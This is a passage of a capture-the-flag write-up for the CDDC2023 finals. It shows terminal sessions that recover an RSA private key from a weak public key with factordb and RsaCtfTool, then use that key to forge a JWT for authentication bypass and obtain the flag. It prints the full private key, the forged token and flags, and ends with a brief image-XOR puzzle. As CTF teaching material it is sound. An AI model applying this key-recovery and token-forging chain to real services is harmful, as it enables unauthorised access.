                                                                                                                                                                                                                  
┌──(wayell㉿wayell)-[~/…/CTF/2023/CDDC2023/finals]
└─$ openssl rsa -in pubkey.der -inform der -pubin -out pubkey.pem
writing RSA key
                                                                                                                                                                                                                  
┌──(wayell㉿wayell)-[~/…/CTF/2023/CDDC2023/finals]
└─$ cat pubkey.pem           
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx9EL9EgTc9vE81nYE8+O
8YERRhBZgkfkYAdsRloylStvD+cwZXAhxljd/XWZtchOOmVkzvzVaCAk87ZrtnM1
AlTFQ9ycjT5QeQ/pblT8WeT5ygi1q1V7sD7Ad7rSS+3W0Ja9qYkC7qvsEbFh0npR
nDouPpb6JBZk9HE/X7Lpn2CsG73sLU7ssViS2sXtwpR/kyne5ccYeHYtmtdTdLo+
H4gJfJHaRKETphkqS6tn3rJC2N5czz9AsCP1CrDcGQQEcI4mbthmFzTY81bFybLK
HXpYOVojCqigp67tipQ7RR9KcWvuboXAHPHs56oVqM9wjFkUo65oiY1RWdh5h8Qd
dwIDAQAB
-----END PUBLIC KEY-----
```

With this, now we have the public key. However, public key is not enough for us to modify the JWT payload and forge the signature, as we need both public and private key. With a weak RSA implementation, the public key can be used to recover the private key. The current public key has a weak implementation as the N can be factorized using factordb. This actually gives us the primes p and q which can be used to construct the private key.

![webbaby_factordb](webbaby_factordb.png)

Alternatively, we can use RsaCtfTool to do the same and get the private key:

```python
┌──(wayell㉿wayell)-[~/Desktop/Install/jwt_tool]
└─$ python3 ~/Desktop/CTF/2023/CDDC2023/finals/RsaCtfTool/RsaCtfTool.py --publickey ./public.key --private

[*] Testing key ./public.key.
attack initialized...
attack initialized...
[*] Performing lucas_gcd attack on ./public.key.
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 9999/9999 [00:00<00:00, 77501.20it/s]
[+] Time elapsed: 0.1374 sec.
[*] Performing pastctfprimes attack on ./public.key.
100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 115/115 [00:00<00:00, 391831.81it/s]
[+] Time elapsed: 0.0015 sec.
[*] Performing nonRSA attack on ./public.key.
[+] Time elapsed: 0.0042 sec.
[*] Performing fibonacci_gcd attack on ./public.key.
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 9999/9999 [00:00<00:00, 77598.57it/s]
[+] Time elapsed: 0.1295 sec.
[*] Performing smallq attack on ./public.key.
[+] Time elapsed: 0.2564 sec.
[*] Performing mersenne_primes attack on ./public.key.
 29%|██████████████████████████████████████████▉                                                                                                       | 15/51 [00:00<00:00, 143969.24it/s]
[+] Time elapsed: 0.0007 sec.
[*] Performing factordb attack on ./public.key.
[*] Attack success with factordb method !
[+] Total time elapsed min,max,avg: 0.0007/0.2564/0.0883 sec.

Results for ./public.key:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAx9EL9EgTc9vE81nYE8+O8YERRhBZgkfkYAdsRloylStvD+cw
ZXAhxljd/XWZtchOOmVkzvzVaCAk87ZrtnM1AlTFQ9ycjT5QeQ/pblT8WeT5ygi1
q1V7sD7Ad7rSS+3W0Ja9qYkC7qvsEbFh0npRnDouPpb6JBZk9HE/X7Lpn2CsG73s
LU7ssViS2sXtwpR/kyne5ccYeHYtmtdTdLo+H4gJfJHaRKETphkqS6tn3rJC2N5c
zz9AsCP1CrDcGQQEcI4mbthmFzTY81bFybLKHXpYOVojCqigp67tipQ7RR9KcWvu
boXAHPHs56oVqM9wjFkUo65oiY1RWdh5h8QddwIDAQABAoIBAEO6gfjNLXrJ9Vof
C/S7F9KYUwiSpiRYxfoeyf6WuCqDzGNxk5/ugCRBHw24fN93A70bfS4D2TowGxZY
sO3o4wDlRvAXqSDfDFvcntz9BYRa7qgih6GJmiFFQ+vRcVK3TWbqkWMTw+CueZgN
rgCv4VW5Cs/AUQ1GYfXRJRAFDtcsThb28jueFYnGmfPVVD3ZLHGR/RIHVhQVQo/e
Gl/a+4dbkSBwgVFiXos5FrfU2WiEUZvGS5BfnKT87e2iFHp+z5bsLYoojhhM9ggN
3MGnrMgrjvPifpsxxnvWUuBst1aYsVBJOdygucW6mEKWmO/v0Fj5fU/jZ6sEGuOl
4UFwHKECgYEA4iue4SVJw2vlCKuBqiIYJsl5vvRfhnQUykxAte6y+wvaR9ZoQx4B
nuGv5K7WdNH5caHE5w3gmCKied9NxPBBI1qHcmqf2YUY8lu65K7YESOG2hvKt7Dj
jPtgcuH218F997rINS7Ds+GkGRxS0iOGw7mFcsd56AKa4PYe2ML0Bb8CgYEA4iue
4SVJw2vlCKuBqiIYJsl5vvRfhnQUykxAte6y+wvaR9ZoQx4BnuGv5K7WdNH5caHE
5w3gmCKied9NxPBBI1qHcmqf2YUY8lu65K7YESOG2hvKt7DjjPtgcuH218F997rI
NS7Ds+GkGRxS0iOGw7mFcsd56AKa4PYe2ML0BkkCgYAO010u1QrozIHO968gP+vl
Xv+kDNDWN3XFbQow4tzIqBY+70cWXzkr+Q9Wpj9YmQsI79nAa6B1WI/d/U1Tw4wB
jUWjsmmYEKl5+ZletDdlqDaGxZucPvQroa7I2RcdPYnMW2oUUmRxvjDLlJe5Pqru
2ZJt27WaB9GvPXL4Mo9ccQKBgEGUemY4RLI4h9nCuT9W0X/1raqT+1rmL90UzTKz
uwwWPL3VyrejbL7gG/uIQsDu3ZB4YrrIiFY0vL3v5QH01D5nEp03k5AkCr7DoGaM
2DPoBEMcCeTHksOfZDELmmKnRVpeu4zIOZDgHY/2aYFrMblxAuPsOUnv727Jjto1
dUKZAoGAWiPvjayK2QQLg3SV/ytE/OhqB3en7T0a1jDw+pikFiRClxDQgqI4TE7R
O5sD2Tm25PC0gTAyjkG+5l6QJ4iQr3tE0rPFRf8/vViASJdOsX9RkkomIGYJETtf
8myb4vmjXSrn6Kyb6RVKrUEV4LyJMFM3Cn+7t13KtmmDBMRsYsE=
-----END RSA PRIVATE KEY-----
```

With both private and public keys, we can tamper with the JWT and modify it to our own payload with jwt.io

Using “AUTH”: 0, we can get the flag. (Initially was trying admin: 1, etc but then decided why not try modifying auth instead)

Tampered JWT: `eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJBVVRIIjowLCJpYXQiOjE2ODc0MTU4NDB9.dN-WOTDqLtRilEDPr0DqVaIGrVz-DXlwskX_vh2EXcGAJYdLNVz83HKM768s-GsrIMRhees26YTMOTTonuSfjZZV1glM0Wf66hwqmPb5R5dMHOlXw_1S7ALdoDPbyf_FycY14VE1Vc9Z1h4djG-1gXdT50Cj2LBJHbm9V9Q17db_OCye5p9-a-bAwy4IPpTk2e1pe6qACB6tcCWXgqE48FObl7_EGBJb7leHxLUPkIqxRnqStJjDszi9EkKZ8Cj4bGGt-qkQmQ4ncFVGo6S9pF7FRCBqH3eOcIrpfD293b-vIHFTASSd8AOsM3d_IN0fkaIHIB89K6Gp-IkDdqcQ4Q`

![webbaby_jwtio](webbaby_jwtio.png)

This gives us the flag: `CDDC2023{Y0u_4R3_th3_b0ss_0f_RS4_4nd_JWT}`

![webbaby_flag](webbaby_flag.png)

---

### Lock and Key - misc (100pts)

> You can easily find the flag if you are not the red blind.
> 

******************Solution:******************

Two image files are given, and a description image file is also given

XOR the two image files together, then check all the different color planes.

I used aperisolve, but you get a barcode which is the flag.

![lockandkey](lockandkey.png)

```python
CDDC2023{whaT_4_Typ1cal_KEy_1t_is}
```